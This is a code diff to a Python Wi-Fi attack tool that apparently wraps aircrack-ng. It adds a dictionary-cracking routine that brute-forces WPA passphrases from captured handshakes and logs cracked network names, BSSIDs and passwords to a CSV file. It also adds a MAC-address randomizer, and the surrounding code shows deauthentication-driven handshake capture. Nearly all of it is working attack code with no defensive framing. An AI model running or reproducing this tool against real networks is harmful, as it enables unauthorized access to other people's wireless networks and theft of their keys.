@@ -35,16 +35,6 @@ GR = '\033[37m'  # gray
 ###################
 mac_pattern=re.compile('([A-F0-9]{2}:){5}[A-F0-9]{2}',re.I)
 
-class CapFile:
-    """
-        Holds data about an access point's .cap file, including AP's ESSID & BSSID.
-    """
-
-    def __init__(self, filename, ssid, bssid):
-        self.filename = filename
-        self.ssid = ssid
-        self.bssid = bssid
-
 def mac_search(string):
     try:
         mac_addr=re.search(mac_pattern, string).group()
@@ -61,6 +51,53 @@ def sec_to_hms(sec):
     m = sec / 60
     sec %= 60
     return '[%02d:%02d:%02d]' % (h, m, sec)
+
+def send_interrupt(process):
+    """
+        Sends interrupt signal to process's PID.
+    """
+    try:
+        os.kill(process.pid, SIGINT)
+        # os.kill(process.pid, SIGTERM)
+    except OSError:
+        pass  # process cannot be killed
+    except TypeError:
+        pass  # pid is incorrect type
+    except UnboundLocalError:
+        pass  # 'process' is not defined
+    except AttributeError:
+        pass  # Trying to kill "None"
+
+def get_mac_address(iface):
+    """
+        Returns MAC address of "iface".
+    """
+    proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN, encoding='utf-8')
+    proc.wait()
+    mac = ''
+    output = proc.communicate()[0]
+    mac_regex = ('[a-zA-Z0-9]{2}-' * 6)[:-1]
+    match = re.search(' (%s)' % mac_regex, output)
+    if match:
+        mac = match.groups()[0].replace('-', ':')
+    return mac
+
+def generate_random_mac(old_mac):
+    """
+        Generates a random MAC address.
+        Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
+        Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
+    """
+    random.seed()
+    new_mac = old_mac[:8].lower().replace('-', ':')
+    for i in range(0, 6):
+        if i % 2 == 0: new_mac += ':'
+        new_mac += '0123456789abcdef'[random.randint(0, 15)]
+
+    # Prevent generating the same MAC address via recursion.
+    if new_mac == old_mac:
+        new_mac = generate_random_mac(old_mac)
+    return new_mac
 
 def parse_targets(filename):
     """
@@ -149,11 +186,14 @@ class Wpa_Attack:
         self.target=""
         self.target_channel=""
         self.target_essid=""
+        self.target_key=""
         self.WPA_DEAUTH_COUNT=1
         self.WPA_ATTACK_TIMEOUT=300
         self.WPA_DEAUTH_TIMEOUT=10
+        self.WPA_DICTIONARY = ''
         self.tempdir=sys.path[0]+os.sep+'temp'
         self.wpa_handshakedir=sys.path[0]+os.sep+'handshake'
+        self.cracked_csv=sys.path[0]+os.sep+'cracked.csv'
 
     def ConfirmRunningAsRoot(self):
         if os.getuid() != 0:
@@ -171,6 +211,41 @@ class Wpa_Attack:
             os.mkdir(self.tempdir)
         if not os.path.exists(self.wpa_handshakedir):
             os.mkdir(self.wpa_handshakedir)
+        if not os.path.exists(self.cracked_csv):
+            with open(self.cracked_csv,'w') as f:
+                f.write("SSID,BSSID,PASSWORD\n")
+
+    def build_opt_parser(self):
+        argparser = argparse.ArgumentParser()
+        argparser.add_argument('--dict', help='Specificy dictionary to use when cracking WPA.', action='store',
+                               dest='dic')
+        argparser.add_argument('-dict', help=argparse.SUPPRESS, action='store', dest='dic')
+
+        return argparser
+
+    def handle_args(self):
+        """
+            Handles command-line arguments, sets global variables.
+        """
+        opt_parser = self.build_opt_parser()
+        options = opt_parser.parse_args()
+        try:
+            if options.dic:
+                try:
+                    self.WPA_DICTIONARY = options.dic
+                except IndexError:
+                    print(R + ' [!]' + O + ' no WPA dictionary given!')
+                else:
+                    if os.path.exists(options.dic):
+                        print(GR + ' [+]' + W + ' WPA dictionary set to %s' % (G + self.WPA_DICTIONARY + W))
+                    else:
+                        print(R + ' [!]' + O + ' WPA dictionary file not found: %s' % (options.dic))
+            else:
+                print(R + ' [!]' + O + ' WPA dictionary file not given!')
+                exit(1)
+        except IndexError:
+            print('\nIndexerror')
+
 
     def start_monitor_mode(self):
         proc = Popen(['iwconfig',self.iface],stdout=PIPE,stderr=DEVNULL,encoding='utf-8')
@@ -296,8 +371,8 @@ class Wpa_Attack:
 
     def display_targets(self):
         print(" "+"-"*75)
-        print(" %-4s %-19s %-17s  %-2s  %-4s  %-5s  %4s  %s"\
-            %('NUM','ESSID','BSSID','CH','ENCR','POWER','WPS?','CLIENT'))
+        print(" %-4s %-19s %-17s  %-2s  %-4s  %-5s  %4s %s"\
+            %('NUM','ESSID','BSSID','CH','ENCR','POWER','WPS?',' CLIENT'))
         print(" "+"-"*75)
         num=1
         for target in self.targets:
@@ -310,7 +385,7 @@ class Wpa_Attack:
             else:
                 essid = C + essid[0:16] + '...' + W
             bssid=P+target[0]+W
-            channel=G+target[1][1].ljust(2)+W
+            channel=G+target[1][1].rjust(2)+W
             encryption=O+target[1][2].ljust(4)+W
             power=target[1][3]
             if power >= 55:
@@ -326,12 +401,12 @@ class Wpa_Attack:
                 wps=R+wps.ljust(4)+W
             client=target[1][5]
             if client == 1:
-                client=G+'client'+W
+                client=G+' client'+W
             elif client > 1:
                 client=O+str(client)+G+'clients'+W
             else:
                 client=""
-            sys.stdout.write(" %-4s %-19s %-17s  %-2s  %-4s  %-5s  %4s  %s\n"\
+            sys.stdout.write(" %-4s %-19s %-17s  %-2s  %-4s  %-5s  %4s %s\n"\
                 %(G+str(num).ljust(4)+W,essid,bssid,channel,encryption,power,wps,client))
             num+=1
         sys.stdout.flush()
@@ -348,6 +423,67 @@ class Wpa_Attack:
         txt = proc_crack.communicate()[0]
 
         return (txt.find('Passphrase not in dictionary') != -1)
+
+    def wpa_crack(self,capfile):
+        """
+            Cracks cap file using aircrack-ng
+            This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
+            they can do so manually.
+        """
+
+        print(GR + '\n [00:00:00]' + W + ' cracking %s with %s' % (G + self.target_essid + W, G + 'aircrack-ng' + W))
+        wpakey_file = self.tempdir + os.sep + 'wpakey.txt'
+        output_file = self.tempdir + os.sep + 'output.txt'
+        cmd = ['aircrack-ng',
+               '-a', '2',  # WPA crack
+               '-w', self.WPA_DICTIONARY,  # Wordlist
+               '-l', wpakey_file,  # Save key to file
+               '-b', self.target,  # BSSID of target
+               capfile]
+
+        proc = Popen(cmd, stdout=open(output_file, 'a'), stderr=DEVNULL, encoding='utf-8')
+        try:
+            pattern=re.compile('\[([0-9][0-9]:){2}[0-9]{2}\].*k/s\)')
+            while True:
+                time.sleep(1)
+
+                if proc.poll() != None:  # aircrack stopped
+                    if os.path.exists(wpakey_file):
+                        # Cracked
+                        inf = open(wpakey_file)
+                        self.target_key = inf.read().strip()
+                        inf.close()
+
+                        print(GR + '\n [+]' + W + ' cracked %s (%s)!' % (G + self.target_essid + W, G + self.target + W))
+                        print(GR + ' [+]' + W + ' key:    "%s"\n' % (C + self.target_key + W))
+                        with open(self.cracked_csv,'a') as f:
+                            f.write(self.target_essid+','+self.target+','+self.target_key+'\n')
+                    else:
+                        # Did not crack
+                        print(R + '\n [!]' + R + 'crack attempt failed' + O + ': passphrase not in dictionary' + W)
+                    break
+
+                inf = open(output_file, 'r')
+                lines = inf.read().split('\n')
+                inf.close()
+                outf = open(output_file, 'w')
+                outf.close()
+                for line in lines:
+                    match = re.search(pattern,line)
+                    if match:
+                        print("\r %-70s" % \
+                            (GR + match.group() + W),end='')
+                        sys.stdout.flush()
+                        break
+
+        except KeyboardInterrupt:
+            print(R + '\n (^C)' + O + ' WPA cracking interrupted' + W)
+
+        send_interrupt(proc)
+        try:
+            os.kill(proc.pid, SIGTERM)
+        except OSError:
+            pass
 
     def wpa_get_handshake(self):
         file_prefix = os.path.join(self.tempdir, 'handshake')
@@ -408,6 +544,7 @@ class Wpa_Attack:
                     got_handshake = True
             if not got_handshake:
                 print(R + ' [00:00:00]' + O + ' unable to capture handshake in time' + W)
+                self.stop_monitor_mode()
             else:
                 send_interrupt(proc_read)
                 send_interrupt(proc_deauth)
@@ -419,6 +556,10 @@ class Wpa_Attack:
                     % (GR + sec_to_hms(seconds_running) + W, O, W))
                 print('            "%s"'% (C + cap_file + W))
                 self.stop_monitor_mode()
+                if self.WPA_DICTIONARY == '':
+                    print(R + ' [!]' + O + ' no WPA dictionary found! use -dict <file> command-line argument' + W)
+                else:
+                    self.wpa_crack(cap_file)
 
         except KeyboardInterrupt:
             print(R + '\n (^C)' + O + ' WPA handshake capture interrupted' + W)
@@ -427,61 +568,14 @@ class Wpa_Attack:
             self.stop_monitor_mode()
 
     def Start(self):
+        self.handle_args()
         self.CreateFolder()
-        self.ConfirmCorrectPlatform()
         self.ConfirmRunningAsRoot()
-        self.CreateFolder()
+        self.ConfirmCorrectPlatform()
         self.initial_ifaces()
         self.get_iface()
         self.scan()
         self.wpa_get_handshake()
-
-def send_interrupt(process):
-    """
-        Sends interrupt signal to process's PID.
-    """
-    try:
-        os.kill(process.pid, SIGINT)
-        # os.kill(process.pid, SIGTERM)
-    except OSError:
-        pass  # process cannot be killed
-    except TypeError:
-        pass  # pid is incorrect type
-    except UnboundLocalError:
-        pass  # 'process' is not defined
-    except AttributeError:
-        pass  # Trying to kill "None"
-
-def get_mac_address(iface):
-    """
-        Returns MAC address of "iface".
-    """
-    proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN, encoding='utf-8')
-    proc.wait()
-    mac = ''
-    output = proc.communicate()[0]
-    mac_regex = ('[a-zA-Z0-9]{2}-' * 6)[:-1]
-    match = re.search(' (%s)' % mac_regex, output)
-    if match:
-        mac = match.groups()[0].replace('-', ':')
-    return mac
-
-def generate_random_mac(old_mac):
-    """
-        Generates a random MAC address.
-        Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
-        Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
-    """
-    random.seed()
-    new_mac = old_mac[:8].lower().replace('-', ':')
-    for i in range(0, 6):
-        if i % 2 == 0: new_mac += ':'
-        new_mac += '0123456789abcdef'[random.randint(0, 15)]
-
-    # Prevent generating the same MAC address via recursion.
-    if new_mac == old_mac:
-        new_mac = generate_random_mac(old_mac)
-    return new_mac
 
 if __name__=='__main__':
     wpa_attack=Wpa_Attack()
